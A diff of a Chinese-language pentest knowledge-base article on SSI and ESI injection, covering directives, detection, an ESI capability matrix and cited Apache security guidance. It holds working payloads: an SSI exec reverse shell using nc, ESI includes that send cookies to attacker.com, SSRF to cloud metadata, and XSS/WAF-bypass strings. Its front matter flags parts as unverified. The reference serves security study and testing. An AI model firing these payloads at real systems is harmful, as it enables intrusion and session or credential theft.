@@ -1,719 +1,488 @@
 ---
-attack_surface: [注入类, 缓存/代理逻辑]
-impact: [远程代码执行, 信息泄露, 身份伪造]
+attack_surface:
+  - 缓存/代理逻辑
+  - 注入类
+impact:
+  - 远程代码执行
+  - 信息泄露
+  - 完整性破坏
 risk_level: 高
 prerequisites:
-  - HTTP 缓存/代理架构理解
-  - SSI/ESI 基础语法
+  - HTTP 缓存机制（Cache-Control、Surrogate-Control）
+  - HTML 注释与 XML 语法基础
 related_techniques:
-  - xslt-server-side-injection
+  - xss
+  - xslt-injection
+  - xxe
   - cache-poisoning
-  - ssrf-server-side-request-forgery
-  - xss-cross-site-scripting
+  - ssrf
   - crlf-injection
-  - http-request-smuggling
+  - open-redirect
 difficulty: 中级
 tools:
-  - Burp Suite ESI Injector
-  - ssi_esi.txt (fuzz wordlist)
+  - burp-suite
+  - ssi-esi-wordlist
+status: NEEDS_HUMAN_REVIEW
+degradation_reason: |
+  8 个资源中 3 个降解（37.5%）。P0-01 / P0-02 GoSecure 两篇 ESI 原始研究
+  （2018 Part 1、2019 Part 2）：域名已迁移，全部回退工具穷尽
+  （curl → 官网首页壳 2493 字节；bb-browser 无 fetch 命令；Playwright 渲染
+  仍为官网首页；代理 127.0.0.1:10808 未运行）。恢复尝试：archive.org
+  availability API 超时（直连 exit 28、代理 exit 7）、web.archive.org 直连超时。
+  核心内容已由 Hacktricks 二手源保留（能力矩阵 §2.3、CVE-2019-2438 payload §4.8），
+  但 Part 2 中各实现细节与 CVE 受影响产品/版本无法独立验证。
+  P2-01 infosecwriteups：Cloudflare 机器人验证墙（curl 与 Playwright 均被拦）。
+verified_resources: |
+  P1: httpd.apache.org SSI 教程（21 KB — exec 执行环境、config 指令、
+  IncludesNOEXEC 安全原文已补充 §3.1/§3.2/§3.4/§A.2）
+  P2: Auto_Wordlists ssi_esi.txt（92 行 — 字典内容摘要已补充 §A.3）
+  XREF: XSLT / XSS README / nginx.md 均 READ + MERGE
 ---
 
-# SSI & ESI Injection — 服务端包含与边缘侧包含注入
-> 关联文档：[XSLT Server Side Injection](../XSLT%20Server%20Side%20Injection/README.md) · [Cache Poisoning&Cache Deception](../Cache%20Poisoning%26Cache%20Deception/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) · [XSS](../../User%20input/Reflected%20Values/XSS/README.md) · [CRLF](../../User%20input/Reflected%20Values/CRLF/README.md) · [HTTP Request Smuggling](../HTTP%20Request%20Smuggling/README.md)
+# Server Side Inclusion & Edge Side Inclusion Injection — 服务端包含与边缘侧包含注入
+
+> 关联文档：[XSLT Server Side Injection](../XSLT%20Server%20Side%20Injection/README.md) · [XXE](../../User%20input/Structured%20objects/XXE/README.md) · [XSS](../../User%20input/Reflected%20Values/XSS/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) · [Cache Poisoning&Cache Deception](../Cache%20Poisoning%26Cache%20Deception/README.md) · [CRLF 注入](../../User%20input/Reflected%20Values/CRLF/README.md) · [Open Redirect](../../User%20input/Reflected%20Values/Open%20Redirect/README.md)
+
+---
+
+### 知识路径
+
+```plaintext
+Server Side Inclusion & Edge Side Inclusion（本文档）
+  ├── SSI：Web 服务器在 HTML 输出管线中对 <!--#directive ... --> 注释指令的二次解释
+  │     └── 上游：HTTP 基础 · Apache / Nginx 模块（mod_include / ngx_http_ssi_filter_module）
+  ├── ESI：缓存 / 边缘节点（Surrogate）对 <esi:*> XML 标记的解释
+  │     └── 上游：HTTP 缓存机制（Cache-Control、Vary、Surrogate-Control）
+  ├── 升级链：ESI + XSLT → XXE / SSRF（见 XSLT Server Side Injection 文档）
+  └── 攻击链入口：反射 / 存储型 XSS 位置、任意响应内容注入（见 XSS 文档）
+```
 
 ---
 
 # 0x01 原理与分类
 
-## 1.1 攻击面总览
+## 1.1 两种服务器侧包含技术
 
-SSI（Server Side Inclusion，服务端包含）与 ESI（Edge Side Inclusion，边缘侧包含）是两种名称相近但**执行位置与根因完全不同**的注入技术：
+### SSI — Server Side Includes（服务端包含）
 
-- **SSI** 在 **Web 服务器**（Apache/Nginx/IIS）发送响应前解析，属于经典的服务端指令注入。
-- **ESI** 在 **CDN / 缓存代理**（Akamai、Cloudflare、Varnish、Squid）这一层解析，属于代理层逻辑缺陷。
+> 引言取自 [Apache 官方文档](https://httpd.apache.org/docs/current/howto/ssi.html)
 
-> **ESI 注入 ≠ 模板注入，而是"边缘计算层的 SSRF + 数据窃取 + 响应劫持"综合漏洞。**
+SSI（Server Side Includes）是**放置在 HTML 页面中、在服务器提供页面的同时被服务器求值**的指令。它们允许你向现有 HTML 页面**添加动态生成的内容**，而无需通过 CGI 程序或其他动态技术提供整个页面。
 
-## 1.2 SSI — 服务端解析注入（根因：注入类）
+例如，你可以将如下指令放入现有 HTML 页面：
 
-SSI 是一种简单的服务端脚本语言，用于在 HTML 页面被发送到客户端之前，将动态内容（如当前时间、文件内容、CGI 脚本输出）嵌入到静态页面中。
+```html
+<!--#echo var="DATE_LOCAL" -->
+```
 
-- **文件后缀**：常见于 `.shtml`、`.shtm`、`.stm`。
-- **基本语法**：`<!--#directive param="value" -->`，如：`<!--#echo var="DATE_LOCAL" -->`，输出：`Tuesday, 15-Jan-2013 19:28:54 EST`
-- **常见 Web Server 支持**：
-  - Apache（`mod_include`）
-  - Nginx（需显式开启）
-  - IIS（较少见）
-- **触发条件**：
-  - 页面被当作 SSI 解析（不是所有 HTML 都会解析）
-  - 通常需满足：
-    - 文件后缀：`.shtml` / `.shtm` / `.stm`
-    - 或配置：`Options +Includes`
+当页面被提供时，该片段会被求值并替换为其值：
 
-触发链：用户输入反射进响应 → 响应由启用 `mod_include`（或 `ssi on`）的服务器解析 → `<!--#...-->` 指令在服务端执行 → 输出嵌入页面。
+```plaintext
+Tuesday, 15-Jan-2013 19:28:54 EST
+```
 
-**`exec` 指令的安全模型**（[Apache 官方文档](https://httpd.apache.org/docs/current/howto/ssi.html)）：`exec` 会以 **Web 服务器进程的权限**执行任意命令，官方明确警告这是重大安全风险；若站点存在用户可编辑内容，应使用 `Options +IncludesNOEXEC` 代替 `+Includes` 以禁用 exec。
+何时使用 SSI、何时让页面完全由程序生成，通常取决于页面有多少静态内容、有多少内容需要在每次提供页面时重新计算。SSI 是添加少量信息（如上面展示的当前时间）的好方法。但如果页面大部分内容在提供时生成，则需要寻找其他方案。
 
-## 1.3 ESI — 边缘层解析（根因：缓存/代理逻辑）
+如果 Web 应用使用扩展名为 **`.shtml`、`.shtm` 或 `.stm`** 的文件，可以推断存在 SSI，但这并非唯一情况。
 
-ESI 是一种标记语言，通常在 **CDN（如 Akamai、Cloudflare）** 或 **缓存代理（如 Varnish、Squid）** 这一层运行。它允许缓存服务器从不同的源抓取动态片段并拼接到缓存的静态模板中。
+典型的 SSI 表达式格式如下：
 
-GoSecure 测试确认约 12 款可处理 ESI 的产品：**Varnish、Squid Proxy、IBM WebSphere、Oracle Fusion/WebLogic、Akamai、Fastly、F5、Node.js ESI（esi/nodesi 模块）、LiteSpeed** 及部分语言插件。注意：并非所有产品都默认启用 ESI。
+```html
+<!--#directive param="value" -->
+```
 
-**ESI 使用 XML 风格标签：**
+### ESI — Edge Side Includes（边缘侧包含）
+
+缓存动态应用内容存在一个问题：内容的一部分可能在下一次获取内容时**已经变化**。这就是 **ESI** 的用途——使用 ESI 标签来标记**需要在发送缓存版本之前生成的动态内容**。
+
+如果**攻击者**能够在缓存内容中**注入 ESI 标签**，那么他就可以在文档发送给用户之前，在文档中**注入任意内容**。
+
+## 1.2 根因分析：二次解释与下游处理器信任
+
+SSI 与 ESI 注入共享同一个根因模式——**内容在渲染管线中被下游处理器二次解释**，而攻击者控制的数据恰好落入了这一解释上下文：
+
+- **SSI**：Web 服务器对启用 SSI 的页面先按 HTML 输出、再扫描 `<!--#... -->` 指令。任何流入页面的用户输入（文件名、参数回显、上传内容）只要携带指令语法，就会被服务器当作指令执行。SSI 解释上下文还可能导致更隐蔽的异常行为：Nginx 的 SSI 过滤模块（`ngx_http_ssi_filter_module`）曾被发现在特定情况下将**用户提供的数据当作 Nginx 变量处理**，该异常由 [HackerOne report 370094](https://hackerone.com/reports/370094) 披露并定位到 [SSI 过滤模块源码](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365)。
+- **ESI**：缓存 / 边缘节点（Surrogate）在回源响应中解释 `<esi:*>` 标记。攻击者只要能把 ESI 语法注入被缓存的页面——任何反射型或存储型内容注入位置都可以——缓存就会以攻击者可控的语义处理页面片段。受害者从缓存取到的已是**加工后的内容**，攻击面从应用层转移到**缓存基础设施**，常规 WAF 与输入过滤通常不理解 ESI 语义。
+- **攻击链升级**：如果在使用缓存的站点上拿到了 [XSS](../../User%20input/Reflected%20Values/XSS/README.md)，可以尝试通过 ESI 注入将其升级为 [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md)，并利用它绕过 Cookie 限制、XSS 过滤器等。
+
+```python
+<esi:include src="http://yoursite.com/capture" />
+```
+
+## 1.3 SSI vs ESI 对比
+
+| 维度 | SSI | ESI |
+|------|-----|-----|
+| 执行位置 | Web 服务器（Apache / IIS / Nginx） | 缓存 / 边缘节点（Squid / Varnish / Fastly / Akamai） |
+| 标记语法 | HTML 注释 `<!--#directive param="value" -->` | XML 命名空间 `<esi:include .../>` |
+| 触发条件 | 页面启用 SSI 解析（`.shtml` 等扩展名或服务器配置） | 缓存启用 ESI 处理，响应携带 `Surrogate-Control` |
+| 主要危害 | RCE（`exec`）、任意文件包含、环境变量枚举 | XSS、SSRF、Cookie 窃取、响应头注入、开放重定向、XXE（+XSLT） |
+| 检测特征 | 无标准响应头，靠扩展名指纹 | `Surrogate-Control: content="ESI/1.0"` |
+| 能力模型 | 指令集固定，取决于服务器配置 | 各实现支持子集不同（见 §2.3 能力矩阵） |
+
+# 0x02 检测 / 前置条件
+
+## 2.1 SSI 指纹与检测
+
+- **扩展名指纹**：`.shtml`、`.shtm`、`.stm`——但并非唯一情况，SSI 也可能通过服务器配置作用于普通扩展名。
+- **探测 payload**：向一切可能落入页面的输入（文件名、参数值、上传内容、错误回显）提交：
+
+```javascript
+// Document name
+<!--#echo var="DOCUMENT_NAME" -->
+// Date
+<!--#echo var="DATE_LOCAL" -->
+```
+
+若返回内容中出现服务器解析后的值（如文档名、服务器本地时间），即确认 SSI 注入。
+
+## 2.2 ESI 检测
+
+服务器响应中出现以下**头**意味着服务器正在使用 ESI：
+
+```http
+Surrogate-Control: content="ESI/1.0"
+```
+
+如果找不到该头，服务器**可能仍然在使用 ESI**。此时可以采用**盲利用方式**——目标服务器应当向攻击者服务器发起请求：
+
+```javascript
+// Basic detection
+hell<!--esi-->o
+// If previous is reflected as "hello", it's vulnerable
+
+// Blind detection
+<esi:include src=http://attacker.com>
+
+// XSS Exploitation Example
+<esi:include src=http://attacker.com/XSSPAYLOAD.html>
+
+// Cookie Stealer (bypass httpOnly flag)
+<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>
+
+// Introduce private local files (Not LFI per se)
+<esi:include src="supersecret.txt">
+
+// Valid for Akamai, sends debug information in the response
+<esi:debug/>
+```
+
+- `hell<!--esi-->o` 若被反射为 `hello` → 存在 ESI 处理。
+- 盲检测：注入 `<esi:include src=http://attacker.com>`，若攻击者服务器收到来自目标缓存节点的请求 → 确认可利用。
+- `<esi:debug/>` 仅对 Akamai 有效，会在响应中附带调试信息。
+
+## 2.3 ESI 软件能力矩阵
+
+[GoSecure](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) 建立了如下表格，用于理解针对不同 ESI 能力软件可以尝试的攻击，取决于其支持的功能：
+
+- **Includes**：支持 `<esi:includes>` 指令
+- **Vars**：支持 `<esi:vars>` 指令。对绕过 XSS 过滤器很有用
+- **Cookie**：文档 Cookie 对 ESI 引擎可见
+- **Upstream Headers Required**：除非上游应用提供相应头，否则 Surrogate 应用不会处理 ESI 语句
+- **Host Allowlist**：此情况下 ESI include 仅允许来自被允许服务器主机，使得例如 SSRF 只能针对这些主机发起
+
+|         **Software**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
+| :--------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
+|            Squid3            |     Yes      |   Yes    |     Yes     |              Yes              |         No         |
+|        Varnish Cache         |     Yes      |    No    |     No      |              Yes              |        Yes         |
+|            Fastly            |     Yes      |    No    |     No      |              No               |        Yes         |
+| Akamai ESI Test Server (ETS) |     Yes      |   Yes    |     Yes     |              No               |         No         |
+|          NodeJS esi          |     Yes      |   Yes    |     Yes     |              No               |         No         |
+|        NodeJS nodesi         |     Yes      |    No    |     No      |              No               |      Optional      |
+
+## 2.4 利用前提
+
+1. **内容流入**：用户输入必须进入被 SSI / ESI 处理器处理的内容流——反射型或存储型回显、上传文件、错误页等一切可注入标记的位置。
+2. **SSI**：目标文件由启用 SSI 的处理器服务（扩展名指纹或服务器配置）。
+3. **ESI**：响应流经支持 ESI 的缓存节点；部分实现（Squid3、Varnish）要求上游提供相应头（Upstream Headers Required）；部分实现（Varnish、Fastly）存在 Host Allowlist，include 目标受限。
+4. **能力匹配**：具体可利用的变体取决于目标软件的能力矩阵（§2.3）——例如 Varnish 不支持 `Vars` 与 `Cookie` 访问，则 §4.2 与 §4.3 类攻击不可用。
+
+# 0x03 SSI 指令集与利用
+
+## 3.1 指令集总览
+
+SSI 指令全集与用途：
+
+```javascript
+// Document name
+<!--#echo var="DOCUMENT_NAME" -->
+// Date
+<!--#echo var="DATE_LOCAL" -->
+
+// File inclusion
+<!--#include virtual="/index.html" -->
+// Including files (same directory)
+<!--#include file="file_to_include.html" -->
+// CGI Program results
+<!--#include virtual="/cgi-bin/counter.pl" -->
+// Including virtual files (same directory)
+<!--#include virtual="file_to_include.html" -->
+// Modification date of a file
+<!--#flastmod file="index.html" -->
+
+// Command exec
+<!--#exec cmd="dir" -->
+// Command exec
+<!--#exec cmd="ls" -->
+// Reverse shell
+<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
+
+// Print all variables
+<!--#printenv -->
+// Setting variables
+<!--#set var="name" value="Rich" -->
+```
+
+| 指令 | 用途 | 危害 |
+|------|------|------|
+| `echo` | 输出变量值（`DOCUMENT_NAME`、`DATE_LOCAL`、`DOCUMENT_URI`、`DOCUMENT_ROOT`、`HTTP_COOKIE`、`REMOTE_ADDR` 等） | 信息泄露 |
+| `include virtual` / `include file` | 包含虚拟路径 / 同目录文件，可执行 CGI | 任意文件包含、CGI 结果注入 |
+| `flastmod` | 输出文件最后修改时间（支持 `file` / `virtual` 参数） | 信息泄露 |
+| `fsize` | 输出文件大小（`bytes` / `abbrev` 格式，`sizefmt` 控制） | 信息泄露 |
+| `exec cmd` | 执行系统命令 | **RCE** |
+| `config` | 设置错误消息 `errmsg`、时间格式 `timefmt`、文件大小格式 `sizefmt` | 泄露定制、探测辅助 |
+| `printenv` | 输出所有环境变量 | 信息泄露 |
+| `set` | 设置变量；变量可引用其他变量（`$` 前缀），字面 `$` 用反斜杠转义 | 配合其他指令构造利用 |
+
+补充指令示例（Apache 官方文档与 [ssi_esi.txt 字典](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt)）：
+
+```html
+<!--#config errmsg="[Content unavailable]" -->
+<!--#config timefmt="A %B %d %Y %r" -->
+<!--#fsize file="ssi.shtml" -->
+<!--#set var="modified" value="$LAST_MODIFIED" -->
+<!--#set var="cost" value="\$100" -->
+```
+
+## 3.2 命令执行（RCE）
+
+`exec` 是 SSI 指令集中最危险的一项，可直接执行系统命令：
+
+```javascript
+// Command exec
+<!--#exec cmd="dir" -->
+// Command exec
+<!--#exec cmd="ls" -->
+// Reverse shell
+<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
+```
+
+反弹 shell 载荷利用 `mkfifo` 建立命名管道，将 `nc` 输出重定向至 `/bin/bash` 并将交互流回传攻击者主机。
+
+**执行环境**（Apache 官方文档）：`exec` 可以运行 shell 命令并把输出包含进页面。在类 Unix 系统上，命令经 `/bin/sh` 执行；在 Windows 上，经命令 shell 执行——**以 Web 服务器进程的权限运行**。字典中另有探测 / 危害变体：`cat /etc/passwd`、`whoami`、`uname`、`/bin/ls /`、`curl http://...`、`wget http://.../shell.txt`、`sleep 10`（延时盲测）、`perl -e 'print "X"*5000'`（DoS 测试）。
+
+## 3.3 文件包含与信息枚举
+
+```javascript
+// File inclusion
+<!--#include virtual="/index.html" -->
+// Including files (same directory)
+<!--#include file="file_to_include.html" -->
+// CGI Program results
+<!--#include virtual="/cgi-bin/counter.pl" -->
+// Modification date of a file
+<!--#flastmod file="index.html" -->
+```
+
+`include virtual` 可以包含 CGI 程序的执行结果，也可用于将敏感文件内容拉入响应；`flastmod` 与 `printenv` 分别泄露文件时间戳与服务器环境变量。
+
+## 3.4 条件与限制
+
+- SSI 解析必须由服务器配置开启（Apache 的 `mod_include` + `Options +Includes`），或文件以被解析的扩展名（`.shtml`、`.shtm`、`.stm`）服务。
+- `exec` 指令受服务器配置约束：Apache 的 `Options IncludesNOEXEC` 配置下 `exec` 不可用，但 `include` 等其余指令仍生效。Apache 官方文档明确警告：「**The exec feature is a significant security risk. It executes arbitrary commands with the permissions of the web server process. If users can edit content on your site, ensure this feature is disabled by using IncludesNOEXEC instead of Includes in the Options directive.**」
+- 注入位置必须在**服务器解析 SSI 之前**进入页面内容——即输入直接写入 `.shtml` 文件或进入被 SSI 处理的内容流。
+
+# 0x04 ESI 利用变体
+
+## 4.1 XSS 注入
+
+以下 ESI 指令会将任意文件加载到服务器响应中：
 
 ```xml
-<esi:include src="URL" />
-```
-
-**示例：**
-
-```xml
-<esi:include src="/header.html"/>
-```
-
-**带变量示例：**
-
-```xml
-<esi:include src="/profile?id=$(QUERY_STRING{user})"/>
-```
-
-**ESI 变量：**
-
-- `$(HTTP_COOKIE)`
-- `$(HTTP_USER_AGENT)`
-- `$(QUERY_STRING)`
-- `$(REMOTE_ADDR)`
-
-**常见标签：**
-
-| 标签                        | 功能              |
-| --------------------------- | ----------------- |
-| `esi:include`               | 引入远程/本地资源 |
-| `esi:vars`                  | 使用变量          |
-| `esi:remove`                | 条件删除          |
-| `esi:choose/when/otherwise` | 条件判断          |
-
-## 1.4 SSI 与 ESI 对比
-
-| **维度**     | **SSI (Server Side)**            | **ESI (Edge Side)**                       |
-| ------------ | -------------------------------- | ----------------------------------------- |
-| **执行位置** | Web 服务器 (Apache/Nginx/IIS)    | 边缘节点/缓存代理 (Varnish/CDN)           |
-| **触发点**   | 文件解析                         | 响应解析                                  |
-| **核心威胁** | **RCE (命令执行)**、敏感文件泄露 | **SSRF**、**Cookie 窃取 (绕过 HttpOnly)** |
-| **隐蔽性**   | 较低，常依赖特定后缀             | 较高，可能被 WAF/后端完全忽略             |
-
----
-
-# 0x02 检测与指纹识别
-
-## 2.1 SSI 检测
-
-1. 在用户反射点注入 `<!--#echo var="DATE_LOCAL" -->`，观察是否输出服务器时间
-2. 注入 `<!--#printenv -->` 观察环境变量输出
-3. 确认响应文件后缀（`.shtml`/`.shtm`/`.stm`）或服务器配置（`Options +Includes`）
-
-## 2.2 ESI 指纹识别
-
-- **响应头**：`Surrogate-Control: content="ESI/1.0"`。注意：**没有此头不代表未启用 ESI**——上游应用可能未显式声明，仍需继续盲测。
-- **盲测 (Blind)**：`hell<!--esi-->o`。如果返回 `hello`，说明存在 ESI 解析。
-- **外带 (OOB)**：`<esi:include src="http://attacker.com">`，检查攻击者服务器是否有请求记录。
-- **敏感资源读取**：`<esi:include src="supersecret.txt">`，检查是否有奇怪的资源响应。
-- **针对 Akamai 的识别指纹**：`<esi:debug/>`
-
-## 2.3 软件支持矩阵
-
-- **Includes**: 支持 `<esi:includes>` 指令
-- **Vars**: 支持 `<esi:vars>` 指令。用于绕过 XSS 过滤器
-- **Cookie**: 文档 cookies 对 ESI 引擎可访问
-- **Upstream Headers Required**: 代理应用程序不会处理 ESI 语句，除非上游应用程序提供头信息
-- **Host Allowlist**: 在这种情况下，ESI 包含仅可能来自允许的服务器主机，使得 SSRF 例如仅可能针对这些主机
-
-|          **软件**           | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
-| :-------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
-|           Squid3            |     Yes      |   Yes    |     Yes     |              Yes              |         No         |
-|        Varnish Cache        |     Yes      |    No    |     No      |              Yes              |        Yes         |
-|           Fastly            |     Yes      |    No    |     No      |              No               |        Yes         |
-| Akamai ESI 测试服务器 (ETS) |     Yes      |   Yes    |     Yes     |              No               |         No         |
-|         NodeJS esi          |     Yes      |   Yes    |     Yes     |              No               |         No         |
-|        NodeJS nodesi        |     Yes      |    No    |     No      |              No               |      Optional      |
-
----
-
-# 0x03 SSI 注入 — 指令与载荷
-
-## 3.1 常用指令
-
-| 指令       | 说明             |
-| ---------- | ---------------- |
-| `echo`     | 输出变量         |
-| `include`  | 包含文件         |
-| `exec`     | 执行命令或 CGI   |
-| `config`   | 设置环境         |
-| `printenv` | 输出所有环境变量 |
-| `set`      | 设置变量         |
-
-## 3.2 攻击载荷
-
-若应用在页面中反射了用户输入且支持 SSI 指令，可导致敏感信息泄露甚至 RCE。
-
-| **指令功能**        | **典型 Payload**                                             | 备注                                                         |
-| ------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
-| **显示文件名/日期** | <!--#echo var="DATE_LOCAL" -->                               |                                                              |
-| **列出环境变量**    | <!--#echo var="DATE_LOCAL" --><br/><!--#echo var="DOCUMENT_ROOT" --><br/><!--#printenv --> |                                                              |
-| **文件包含 (LFI)**  | <!--#include file="/etc/passwd" --><br/><!--#include virtual="/index.php" --> | `file`：相对路径（受限制）<br />`virtual`：URL 路径（更常用） |
-| **CGI 程序执行**     | <!--#include virtual="/cgi-bin/counter.pl" -->               | 通过 CGI 路径执行服务端脚本                                   |
-| **文件修改时间**     | <!--#flastmod file="index.html" -->                          | 泄露文件最后修改时间，辅助信息收集                             |
-| **设置变量**         | <!--#set var="name" value="Rich" -->                         | 配合其他指令（echo/include）实现动态内容注入                   |
-| **命令执行 (RCE)**  | <!--#exec cmd="id" --><br/><!--#exec cmd="whoami" --><br /><!--#exec cgi="/cgi-bin/test.cgi" --> |                                                              |
-| **反弹 Shell**      | <!--#exec cmd="mkfifo /tmp/foo;nc ATTACKER_IP PORT 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" --> | `/bin/bash` 可用<br />服务器允许 `exec`                      |
-
----
-
-# 0x04 ESI 攻击矩阵 — 资源加载控制
-
-## 4.1 攻击矩阵总览
-
-| 能力类型           | 本质                 | 典型危害        |
-| ------------------ | -------------------- | --------------- |
-| **资源加载控制**   | 控制 `<esi:include>` | SSRF / 文件读取 |
-| **变量解析**       | 访问 `$(...)`        | Cookie 泄露     |
-| **响应修改**       | Header / Body 注入   | XSS / 重定向    |
-| **解析器特性滥用** | ESI / XSLT           | XXE / RCE       |
-| **解析绕过**       | WAF / 浏览器过滤绕过 | 高隐蔽攻击      |
-
-## 4.2 SSRF（最核心能力）
-
-#### 原语
-
-```html
-<esi:include src="URL"/>
-```
-
-#### Payload
-
-```html
-<esi:include src="http://127.0.0.1/admin"/>
-<esi:include src="http://169.254.169.254/latest/meta-data/"/>
-<esi:include src="http://internal.service/config"/>
-```
-
-#### 利用条件
-
-- ESI 在 CDN / 代理层解析
-- 无 URL 限制或白名单不严
-
-#### 风险等级
-
-极高
-
-#### 实战要点
-
-- 优先打：
-  - 云 metadata（AWS / GCP）
-  - 内网管理接口（Jenkins / Docker API）
-- SSRF 来源是 **CDN 节点 IP**（绕过内网限制）
-
-结合 [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) 的系统利用方法，可将 ESI 注入升级为内网探测与云凭证窃取。
-
-## 4.3 本地文件读取（Edge LFI）
-
-#### 原语
-
-```html
-<esi:include src="file"/>
-```
-
-#### Payload
-
-```html
-<esi:include src="secret.txt"/>
-```
-
-#### 利用条件
-
-- ESI 引擎允许本地路径
-
-#### 风险等级
-
-中高
-
-#### 实战要点
-
-- 与传统 LFI 不同：
-  - 执行在 CDN / Proxy 层
-- 可读取：
-  - 缓存文件
-  - 配置文件
-
----
-
-# 0x05 ESI 攻击矩阵 — 变量解析与响应修改
-
-## 5.1 Cookie 窃取（绕过 HttpOnly ⭐）
-
-#### 原语
-
-```html
-$(HTTP_COOKIE)
-```
-
-#### Payload
-
-```html
-<esi:include src="http://attacker.com/$(HTTP_COOKIE)"/>
-```
-
-指定 Cookie：
-
-```html
-<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})"/>
-```
-
-#### 利用条件
-
-- ESI 支持变量解析
-- 外部请求允许
-
-#### 风险等级
-
-极高
-
-#### 实战要点
-
-- **直接读取 HttpOnly Cookie（极少见能力）**
-- 比 XSS 更强（因为在服务端执行）
-
-## 5.2 XSS（边缘层注入）
-
-#### 原语
-
-- 响应拼接
-- header 控制
-- HTML 注入
-
-#### Payload
-
-① 基础 XSS
-
-```html
 <esi:include src=http://attacker.com/xss.html>
 ```
 
-② 绕过 Chrome XSS Filter
+在缓存站点上，结合 [XSS](../../User%20input/Reflected%20Values/XSS/README.md) 可升级为对缓存节点的 [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md)：`<esi:include src="http://yoursite.com/capture" />`——详见 §1.2 攻击链。
 
-```html
-<esi:assign name="var1" value="'cript'"/>
-<s<esi:vars name="$(var1)"/>>alert(1)</s<esi:vars name="$(var1)"/>>
+## 4.2 绕过客户端 XSS 过滤与 WAF
+
+```xml
+x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
+
+Use <!--esi--> to bypass WAFs:
+<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
+<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
 ```
 
-③ WAF 绕过
+原理：`esi:assign` + `esi:vars` 在 ESI 引擎层拼出 `<script>` 标签，标签本身不会以完整形式出现在原始响应中；`<!--esi-->` 注释在 ESI 处理时被剥离、浏览器收到的是拼接后的完整 `script` 标签——对基于原始响应内容的 WAF / 客户端过滤器形成绕过。
 
-```html
-<scr<!--esi-->ipt>alert(1)</scr<!--esi-->ipt>
-<img src=x on<!--esi-->error=alert(1)>
+## 4.3 Cookie 窃取
+
+- 远程窃取 Cookie：
+
+```xml
+<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
+<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
 ```
 
-④ Cookie 回显（配合 XSS 窃取 HttpOnly Cookie）
+- 通过响应反射窃取带 `HTTP_ONLY` 标志的 Cookie（配合 XSS）：
 
-```html
+```bash
+# This will reflect the cookies in the response
 <!--esi $(HTTP_COOKIE) -->
-```
-
-**机制**：`<!--esi ... -->` 是 ESI 注释形式标记——引擎处理内容并移除定界符，`$(HTTP_COOKIE)` 替换为受害者自己的 Cookie 字符串，原样留在响应正文（HackTricks 原文注释："This will reflect the cookies in the response"）。本 payload 本身不执行脚本、也不外带数据，作用是**把 HttpOnly Cookie 变成 DOM 中的可见文本**；配合页面上已有的 XSS（或条目 ⑤）从 DOM 读取并外带，完成 HttpOnly 绕过。
-
-⑤ Reflect XSS（$url_decode，HackTricks）
-
-```html
+# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
 <!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->
+
+# It's possible to put more complex JS code to steal cookies or perform actions
 ```
 
-> hacktricks 原文注释：可将 `'"><svg/onload=prompt(1)>'` URL 编码后放入表达式，由 `$url_decode` 解码输出；整体 URL 编码后发送 HTTP 请求；检查 `url_decode` 嵌套层数即可知值可被 URL 编码的次数；亦可放置更复杂的 JS 以窃取 Cookie 或执行操作。
->
-> **编码层数模型**（原文注释的展开）：
->
-> ```text
-> 0. 目标构造：     <!--esi/$url_decode('%22%3E%3Csvg%2Fonload%3Dprompt(1)%3E')/-->   内层单层编码
-> 1. 请求形态：     %3C!--esi%2F%24url_decode('%2522%253E%253Csvg%252Fonload%253Dprompt(1)%253E')%2F--%3E   整体再编码
-> 2. 应用解码一次： 标记恢复原样，内层仍为单层编码
-> 3. ESI 引擎求值： $url_decode 解最后一层 → "><svg/onload=prompt(1)> 原样进入 DOM
-> ```
->
-> 要点：标记靠应用的一次解码恢复原样，内层靠 `$url_decode` 在 ESI 求值阶段解最后一层；请求中 XSS 特征处于双层编码，常规只解码一次的 WAF 匹配不到 `<svg` 签名。嵌套 `$url_decode` 层数与内层编码层数对齐；字面 payload 内层未编码时 `$url_decode` 呈恒等，展示的只是构造形态。§5.3 的 `$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->` 即内层双重编码示例。
+`$(HTTP_COOKIE{'JSESSIONID'})` 语法可按 Cookie 名提取单个 Cookie；httpOnly 标志只限制浏览器脚本读取，不限制 ESI 引擎——将 Cookie 反射进响应后由同源 JS 读取即可绕过。
 
-#### 利用条件
+## 4.4 私有本地文件读取
 
-- 响应中反射用户输入
-- ESI 在响应阶段执行
-
-#### 风险等级
-
-高
-
-#### 实战要点
-
-- 绕过：
-  - WAF
-  - CSP（部分情况）
-- 可打缓存投毒 → 全站 XSS
-
